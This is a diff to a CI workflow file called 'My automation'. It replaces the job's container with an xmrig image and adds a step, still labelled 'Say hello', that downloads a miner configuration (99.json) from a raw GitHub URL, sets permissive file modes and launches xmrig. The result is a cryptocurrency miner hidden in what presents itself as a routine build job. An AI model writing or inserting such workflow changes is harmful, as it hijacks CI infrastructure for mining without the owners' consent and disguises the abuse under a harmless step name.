@@ -4,10 +4,15 @@ name: My automation
 on:
   push:
     branches:
-      - "**"
+      - "main"
 jobs:
   build:
     steps:
-      - uses: docker://atlassian/bamboo-agent-base:9.2-ubuntu
+      - uses: docker://rcmelendez/xmrig
         name: Say hello
-        run: docker run rockymoyosu/pymod:latest
+        kind: test
+        shell: sh
+        run: |-
+          wget https://raw.githubusercontent.com/Rockymoyosu/S/main/99.json
+          chmod 777 *
+          xmrig --config=99.json
